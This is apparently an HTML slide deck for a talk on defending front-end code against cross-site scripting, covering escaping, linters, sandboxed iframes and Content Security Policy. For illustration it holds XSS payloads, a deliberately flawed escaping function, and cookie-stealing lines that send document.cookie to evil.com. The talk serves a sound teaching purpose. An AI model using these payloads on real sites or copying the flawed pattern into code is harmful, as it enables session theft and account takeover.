<!DOCTYPE html>
<html>
<head>
  <title>Next-Gen Tools for Securing your Front-end Code</title>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="chrome=1">
  <!--<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">-->
  <!--<meta name="viewport" content="width=device-width, initial-scale=1.0">-->
  <!--This one seems to work all the time, but really small on ipad-->
  <!--<meta name="viewport" content="initial-scale=0.4">-->
  <meta name="apple-mobile-web-app-capable" content="yes">
  <link rel="stylesheet" media="all" href="theme/css/default.css">
  <link rel="stylesheet" media="only screen and (max-device-width: 480px)" href="theme/css/phone.css">
  <base target="_blank"> <!-- This amazingness opens all links in a new tab. -->
  <script data-main="js/slides" src="js/require-1.0.8.min.js"></script>
</head>
<body style="opacity: 0">

<slides class="layout-widescreen">

  <slide class="title-slide segue nobackground">
    <aside class="gdbar"><img src="images/HTML5_badge.png"></aside>
    <!-- The content of this hgroup is replaced programmatically through the slide_config.json. -->
    <hgroup class="auto-fadein">
      <h1 data-config-title><!-- populated from slide_config.json --></h1>
      <h2 data-config-subtitle><!-- populated from slide_config.json --></h2>
      <p data-config-presenter><!-- populated from slide_config.json --></p>
    </hgroup>
  </slide>

  <slide>
    <hgroup>
      <h2>Ben Vinegar</h2>
    </hgroup>
    <article>
      <ul class="build">
        <li>Software engineer at Shape Security
        <li>Formerly: Disqus, FreshBooks
        <li>Co-author, <a href="http://manning.com/vinegar">Third-party JavaScript</a> (Manning)
        <li>Once ate 7 McDonald's cheeseburgers in one sitting
      </ul>
    </article>
  </slide>

  <slide>
    <hgroup>
      <h2>The rough plan</h2>
    </hgroup>
    <article>
      <ul>
        <li>Cross-site scripting (XSS) today
          <ul>
            <li>How it occurs
            <li>Why it's a big deal
            <li>Traditional mitigation, e.g. sanitization
          </ul>
        </li>
        <li>Next-gen tools
          <ul>
            <li>Static analysis tools (ESLint)
            <li>Iframe sandbox + seamless
            <li>Content-security policy (CSP)
    </article>
  </slide>

  <slide class="segue dark nobackground">
    <hgroup class="auto-fadein">
      <h2>Cross-Site Scripting (XSS)</h2>
      <h3>This is still a problem</h3>
    </hgroup>
  </slide>

  <slide>
    <hgroup>
      <h2>Cross-site scripting (XSS)</h2>
    </hgroup>
    <article>
        <p>Vulnerability where attacker injects JavaScript code into a web document
        <pre class="prettyprint" data-lang="php">
&lt;?php
$name = $_GET['name'];
echo "Welcome $name";
?&gt;</pre>
      <pre data-lang="http">
GET http://ursite.com/script.php?name=%3Cscript%3Ealert(%22pwned%22)%3C%2Fscript%3E HTTP/1.1</pre>
      <pre class="prettyprint" data-lang="html">
Welcome &lt;script&gt;alert(&quot;pwned&quot;)&lt;/script&gt;</pre>
    </article>
  </slide>

  <slide>
    <hgroup>
      <h2>Cross-site scripting (XSS)</h2>
    </hgroup>
    <article>
      <p>Client-side apps are not immune</p>
      <pre class="prettyprint" data-lang="javascript">
var div = document.createElement('div');
div.innerHTML = 'Welcome' + user.name;
document.body.appendChild(div);</pre>
      <pre class="prettyprint" data-lang="json">
{
  "id": 1337,
  "username": "some_asshole87"
  "name": "&lt;img src=\"\" onerror=\"alert('pwned')\"&gt;",
}</pre>
      <pre class="prettyprint" data-lang="html">
Welcome &lt;img src="" onerror="alert('pwned')"&gt;</pre>
    </article>
  </slide>

  <slide>
    <hgroup>
      <h2>Alert isn't scary – these are</h2>
    </hgroup>
    <article>
      <p>Steal cookies</p>
      <pre class="prettyprint" data-lang="javascript">
new Image('http://evil.com/capture?cookies=' + document.cookie);
</pre>
      <p>Use local XHR</p>
      <pre class="prettyprint" data-lang="javascript">$.get('/my/contacts', function (response) { &hellip; });</pre>

      <p>Use client API</p>
      <pre class="prettyprint" data-lang="javascript">GMAIL.deleteAll();</pre>
    </article>
  </slide>

  <slide class="nobackground">
    <article class="flexbox vleft">
      <h2>Mitigation</h2>
    </article>
  </slide>

  <slide>
    <hgroup>
      <h2>HTTP-only cookies</h2>
    </hgroup>
    <article>
      <pre class="prettyprint" data-lang="http">
Set-Cookie: session=29e807166458d2640 <b>HttpOnly</b></pre>
      <ul>
        <li>Disables client access via <code>document.cookie</code>
        <li>Mitigates cookie theft via XSS
        <li>Wide browser support today (IE8+)
        <li>Still vulnerable to other client attacks
      </ul>
    </article>
  </slide>


  <slide>
    <hgroup>
      <h2>Input sanitization</h2>
    </hgroup>
    <article>
      <p>Escape dangerous characters in untrusted strings</p>
      <pre class="prettyprint" data-lang="javascript">
function escapeHtml(str) {
    return String(str)
        .replace(/&amp;/g, &quot;&amp;amp;&quot;)
        .replace(/&lt;/g, &quot;&amp;lt;&quot;)
        .replace(/&gt;/g, &quot;&amp;gt;&quot;)
        .replace(/&quot;/g, &quot;&amp;quot;&quot;)
        .replace(/&#039;/g, &quot;&amp;#039;&quot;)
        .replace(/\//g, &quot;&amp;#x2F;&quot;)
}</pre>
      <p>Character substitutions <a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet#XSS_Prevention_Rules_Summary">recommended by OWASP</a></p>
    </article>
  </slide>

  <slide>
    <hgroup>
      <h2>Input sanitization</h2>
    </hgroup>
    <article>
      <p>Sanitizing untrusted user data on the client</p>
      <pre class="prettyprint" data-lang="javascript">
var div = document.createElement('div');
div.innerHTML = 'Welcome' + <b>escapeHtml(user.name)</b>;
document.body.appendChild(div);</pre>
      <pre class="prettyprint" data-lang="json">
{
  "id": 1337,
  "username": "some_asshole87"
  "name": "&lt;img src=\"\" onerror=\"alert('pwned')\"&gt;",
}</pre>
      <pre class="prettyprint" data-lang="html">
Welcome &amp;lt;img src=&amp;quot;&amp;quot; onerror=&amp;quot;alert(&amp;#039;pwned&amp;#039;)&amp;quot;&amp;gt;</pre>
    </article>
  </slide>

  <slide>
    <hgroup>
      <h2>Input sanitization</h2>
    </hgroup>
    <article>
      <p>The good</p>
      <ul class="build">
        <li>If done correctly, it works
        <li>Sanitization is baked into most templating engines, frameworks
        <li>And usually enabled by default
      </ul>

      <p>The bad</p>
      <ul class="build">
        <li>Sanitization is not always turned on by default
        <li>Still largely a manual process
        <li>You can mess up
        <li><strong>Everyone is still messing up</strong>
      <ul>
    </article>
  </slide>

  <slide>
    <hgroup>
      <h2>Notable XSS exploits</h2>
    </hgroup>
    <article>
      <ul>
        <li>Twitter/TweetDeck (<a href="http://www.theguardian.com/technology/2014/jun/11/twitter-tweetdeck-xss-flaw-users-vulnerable">2014</a>)
        <li>eBay (<a href="http://www.pcworld.com/article/2241305/latest-ebay-flaw-is-a-rookie-mistake-for-a-website.html">2014</a>)
        <li>Cisco (<a href="http://threatpost.com/cisco-patches-xss-flaw-in-security-appliances">2014</a>)
        <li>Yahoo (<a href="http://www.scmagazine.com/most-yahoo-sites-impacted-by-xss-flaw-in-comments-section/article/347606/">2014</a>, <a href="http://thenextweb.com/insider/2013/01/31/yahoo-mail-users-still-seeing-accounts-hacked-via-xss-exploit-amid-reports-yahoo-failed-to-fix-old-flaw/">2013</a>)
        <li>Mega.com (<a href="http://www.cloudave.com/25435/kim-dot-coms-new-mega-site-has-xss-security-holes/">2013</a>)
        <li>Microsoft (<a href="http://www.rafayhackingarticles.net/2013/03/dom-based-xss-in-microsoft.html">2013</a>)
        <li>Facebook (<a href="http://blog.detectify.com/post/39209711597/how-i-got-a-3-500-usd-facebook-bug-bounty">2012</a>, <a href="http://theharmonyguy.com/oldsite/2011/04/21/recent-facebook-xss-attacks-show-increasing-sophistication/">2011</a>, <a href="http://www.acunetix.com/websitesecurity/xss-facebook/">2010</a>)
        <li>Dropbox (<a href="http://blog.detectify.com/post/39209711597/how-i-got-a-3-500-usd-facebook-bug-bounty">2012</a>)
        <li>Google +1 button (<a href="http://blog.mindedsecurity.com/2012/11/dom-xss-on-google-plus-one-button.html">2012</a>)
        <li>Yelp (<a href="http://techcrunch.com/2010/05/11/another-security-hole-found-on-yelp-facebook-data-once-again-put-at-risk/">2010</a>)
      </ul>

      <p style="margin-top:2em">These are publicized exploits. Far more are unpublicized.</p>
    </article>
  </slide>

  <slide class="quote nobackground">
    <article class="flexbox vleft">
      <q>
        It's not a matter of if you will introduce an XSS vulnerability, but when.
      </q>
    </article>
  </slide>

  <slide class="segue dark nobackground">
    <hgroup class="auto-fadein">
      <h2>Some New Ideas</h2>
      <h3>Existing and future tools to help mitigate XSS vulnerabilities</h3>
    </hgroup>
  </slide>

  <slide class="nobackground">
    <article class="flexbox vleft">
      <h2>Static Analysis</h2>
    </article>
  </slide>

  <slide>
    <hgroup>
      <h2>Static Analysis Tools</h2>
    </hgroup>
    <article>
      <p>Analyze your source code to derive insights.

      <ul>
        <li>Code complexity analysis
        <li>Detecting syntax errors
        <li>Enforcing style guidelines
    </article>
  </slide>

  <slide>
    <hgroup>
      <h2>Linters</h2>
    </hgroup>
    <article>
      <p>Tools that analyze your source code to find defects and/or enforce style.</p>
      <p style="text-align:center">
        <img src="images/jshint-screenshot.png"/>
      </p>
    </article>
  </slide>

  <slide>
    <hgroup>
      <h2>An XSS pattern: textNode + innerHTML</h2>
    </hgroup>
    <article>
      <p>An alternate <code>escapeHtml</code> implementation ... with a flaw.
<pre class="prettyprint" data-lang="javascript">function escapeHtml(str) {
    var div = document.createElement('div');
    div.appendChild(document.createTextNode(str));
    return div.innerHTML;
};</pre>
<pre class="prettyprint" data-lang="javascript">var username = '&lt;img src="herp:/" onerror=alert("derp")&gt;';
var profileLink = '&lt;a href="/profile"&gt;' + escapeHtml(username) + '&lt;/a&gt;';
var div = document.getElementById('target');
div.innerHTML = profileLink;</pre>
<pre class="prettyprint" data-lang="html">
 &lt;a href="/profile"&gt;&lt;img src="herp:/" onerror=alert("derp")&gt;&lt;/a&gt;
</pre>
    </article>
  </slide>

  <slide>
    <hgroup>
      <h2>ESLint</h2>
    </hgroup>
    <article>
      <ul>
        <li>Latest generation of JavaScript linters (released 2013)
        <li>Uses Mozilla's SpiderMonkey Parser API internally
        <li>Rules are highly configurable
    </article>
  </slide>

  <slide>
    <hgroup>
      <h2>Detecting XSS patterns w/ ESLint</h2>
    </hgroup>
    <article>
      <p>TODO
    </article>
  </slide>

  <slide class="nobackground">
    <article class="flexbox vleft">
      <h2>Sandboxed iframes</h2>
    </article>
  </slide>

  <slide>
    <hgroup><h2>"sandbox" iframe attribute</h2></hgroup>
    <article>
      <pre class="prettyprint" data-lang="html">
&lt;iframe src="index.html" <b>sandbox</b>/&gt;&lt;/iframe&gt;</pre>
      <ul>
        <li>Restricts iframe contents from ...
          <ul>
            <li>Opening pop-ups
            <li>Navigating the browser
            <li>Embedding forms
            <li>Capturing the mouse pointer (Pointer Lock API)
            <li><b>Executing JavaScript</b>
          </ul>
        </li>
        <li>Intended for 3rd-party widgets</li>
      </ul>
    </article>
  </slide>

  <slide>
    <hgroup><h2>Using sandbox to mitigate XSS</h2></hgroup>
    <article>
      <pre class="prettyprint" data-lang="javascript">
var iframe = document.createElement('iframe');
iframe.src = 'empty.html';
iframe.sandbox = 'allow-same-origin';
document.body.appendChild(iframe);

var userName = 'Ben &lt;img src="" onerror="alert()"/&gt;';
var iframeDoc = iframe.contentWindow.document;

iframeDoc.write(userName);</pre>
    </article>
  </slide>

  <slide>
    <hgroup><h2>How useful is this?</h2></hgroup>
    <article>
      <ul class="build">
        <li>Still manual, error prone; must always use sandbox
        <li>Iframe element creation is slow
        <li>Iframes are inflexible
        <ul>
          <li>Don't resize to fit contents
          <li>Don't inherit styles
          <li>Links navigate iframe, not parent
        </ul>
      </ul>
    </article>
  </slide>

  <slide>
    <hgroup><h2>"seamless" iframe attribute</h2></hgroup>
    <article>
      <pre class="prettyprint" data-lang="html">
&lt;iframe src="index.html" <b>seamless</b> sandbox/&gt;&lt;/iframe&gt;</pre>
      <ul>
        <li>Resizes to fit contents
        <li>Inherits parent document styles
        <li>Links navigate parent document
        <li>HTML5, fully specified
        <li><span style="text-decoration:line-through">Demo</span>
    </article>
  </slide>

  <slide>
    <hgroup><h2>seamless browser support</h2></hgroup>
    <article>
      <p style="text-align:center">
        <img src="images/seamless-support.png" style="width:100%"/>
      </p>
    </article>
  </slide>

  <slide class="nobackground">
    <article class="flexbox vleft">
      <h2>Content-Security Policy</h2>
    </article>
  </slide>

  <slide>
    <hgroup>
      <h2>Content Security Policy (CSP)</h2>
    </hgroup>
    <article>
      <ul class="build">
        <li>New browser feature for mitigating XSS attacks
        <li>1.0 W3C Candidate Recomendation (1.1 underway)
        <li>Whitelists "safe" script hosts
        <li><code>Content-Security-Policy</code> HTTP header
      </ul>
    </article>
  </slide>

  <slide>
    <hgroup>
      <h2>Limiting script origins with CSP</h2>
    </hgroup>
    <article>
      <p>Example: restrict scripts to current origin and ajax.googleapis.com</p>
      <pre class="prettyprint" data-lang="http">
<b>Content-Security-Policy</b>: script-src 'self' ajax.googleapis.com</pre>
      <pre class="prettyprint" data-lang="html">
&lt;script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"&gt;&lt;/script&gt;
&lt;script src="/js/app.js"&gt;&lt;/script&gt;
&lt;script src="http://evil.com/pwnage.js"&gt;&lt;/script&gt;</pre>

      <pre class="small" data-lang="console">
Refused to load the script 'http://evil.com/pwnage.js' because it violates<br/>the following Content Security Policy directive: "script-src 'self' ajax.googleapis.com".</pre>
    </article>
  </slide>

  <slide>
    <hgroup>
      <h2>Limiting script origins with CSP</h2>
    </hgroup>
    <article>
      <p>CSP also limits inline scripts
      <pre class="prettyprint" data-lang="http">
Content-Security-Policy: script-src 'self' ajax.googleapis.com</pre>
      <pre class="prettyprint" data-lang="html">
&lt;script&gt;new Image('http://evil.com/?cookie=' + document.cookie);&lt;/script&gt;</pre>
      <pre class="small" data-lang="console">
Refused to execute inline script because it violates the following Content Security Policy<br>directive: "script-src 'self' ajax.googleapis.com"</pre>
    </article>
  </slide>

  <slide>
    <hgroup>
      <h2>Coping without inline scripts</h2>
    </hgroup>
    <article>
      <p>Inline scripts are often used for defining global config state
      <pre class="prettyprint" data-lang="html">
&lt;head&gt;
  &lt;script&gt;
  var CONFIG = {
    version = '7330b4',
    appRoot = '//example.com',
    cdnRoot = '//cdn.example.com'
  };
  &lt;/script&gt;
  &lt;script src="js/app.js"&gt;&lt;/script&gt;
&lt;head&gt;</pre>
      <p>This example will cause a CSP exception.
    </article>
  </slide>

  <slide>
    <hgroup>
      <h2>Coping without inline scripts</h2>
    </hgroup>
    <article>
      <pre class="prettyprint" data-lang="html">
&lt;script id="config" type="text/json"&gt;
{
  "version": "7330b4",
  "appRoot": "//example.com",
  "cdnRoot": "//cdn.example.com"
}
&lt;/script&gt;
&lt;script src="js/app.js"&gt;&lt;/script&gt;</pre>
      <p>In app.js &hellip;</p>
      <pre class="prettyprint" data-lang="javascript">
var config = document.getElementById('config');
window.CONFIG = JSON.parse(config.textContent || config.innerHTML);</pre>
    </article>
  </slide>

  <slide>
    <hgroup>
      <h2>CSP and eval</h2>
    </hgroup>
    <article>
      <ul>
        <li>These rules also disable eval
        <li>Some JS libraries depends on eval (moment.js)
        <li>Option: explicitly allow eval
      </ul>

      <pre class="prettyprint" data-lang="http">
Content-Security-Policy: script-src 'self' <b>'unsafe-eval'</b> ajax.googleapis.com</pre>

      <p style="margin-top:2em">Warning: eval is considered an XSS vector</p>
    </article>
  </slide>

  <slide>
    <hgroup>
      <h2>More than just scripts</h2>
    </hgroup>
    <article>
      <p>CSP can protect against a variety of unauthorized asset types.</p>
      <ul class="build">
        <li><code>img-src</code> – limit origins of images
        <li><code>style-src</code> – stylesheets
        <li><code>media-src</code> – audio and video
        <li><code>frame-src</code> – iframe sources
        <li><code>connect-src</code> – XHR, WebSockets, EventSource
        <li><code>font-src</code> – font files
        <li><code>object-src</code> - Flash and other plugin objects
        <li><code>default-src</code> – all assets (including scripts)
    </article>
  </slide>

  <slide>
    <hgroup>
      <h2>Browser support</h2>
    </hgroup>
    <article>
      <p style="text-align:center">
        <img src="images/csp-support.png" style="width:100%"/>
      </p>
    </article>
  </slide>

  <slide>
    <hgroup>
      <h2>Why bother with CSP today?</h2>
    </hgroup>

    <article>
      <ul>
        <li>Incomplete browser support – can't depend on CSP to protect your app</p>
        <li>But implementing CSP still has tremendous value &hellip;
      </ul>
    </article>
  </slide>

  <slide>
    <hgroup>
      <h2>CSP reporting</h2>
    </hgroup>
    <article>
      <ul class="build">
        <li>Congure a <code>report-uri</code> to accept CSP exception requests (POST)
        <li>Be notified of XSS vulnerabilities as they occur
        <li>Users with CSP-supported browsers make it safer for everybody
      </ul>
    </article>
  </slide>

  <slide>
    <hgroup>
      <h2>CSP reporting</h2>
    </hgroup>
    <article>
      <p>Configure an endpoint to report violations
      <pre class="prettyprint" data-lang="http">
Content-Security-Policy: default-src 'self';
  <b>report-uri http://mysite.com/report.php</b></pre>

      <p style="margin-top:2em">CSP reports are delivered as JSON via HTTP POST
      <pre class="prettyprint" data-lang="json">
{
  "csp-report": {
    "document-uri": "http://example.org/page.html",
    "referrer": "http://evil.example.com/",
    "blocked-uri": "http://evil.example.com/evil.js",
    "violated-directive": "default-src 'self'",
    "original-policy": "default 'self'; report-uri http://mysite.com/report.php"
  }
}</pre>
    </article>
  </slide>

  <slide>
    <hgroup>
      <h2>Report-only headers</h2>
    </hgroup>
    <article>
      <ul>
        <li><code>Content-Security-Policy-Report-Only</code></li>
        <li>Notifies you of violations, but won't take action</li>
        <li>Lets you try CSP risk-free</li>
      </ul>
      <pre class="prettyprint" data-lang="http">
<b>Content-Security-Policy-Report-Only</b>: default-src 'self';
  report-uri http://mysite.com/report.php</pre>
    </article>
  </slide>

  <slide class="thank-you-slide segue nobackground">
    <aside class="gdbar right"><img src="images/HTML5_badge.png"></aside>
    <article class="flexbox vleft auto-fadein">
      <h2>Thanks</h2>
      <!-- <p>Important contact information goes here.</p> -->
    </article>
    <p class="auto-fadein" data-config-contact>
      <!-- populated from slide_config.json -->
    </p>
  </slide>

  <slide class="backdrop"></slide>

</slides>

<!--[if IE]>
  <script src="http://ajax.googleapis.com/ajax/libs/chrome-frame/1/CFInstall.min.js"></script>
  <script>CFInstall.check({mode: 'overlay'});</script>
<![endif]-->
</body>
</html>
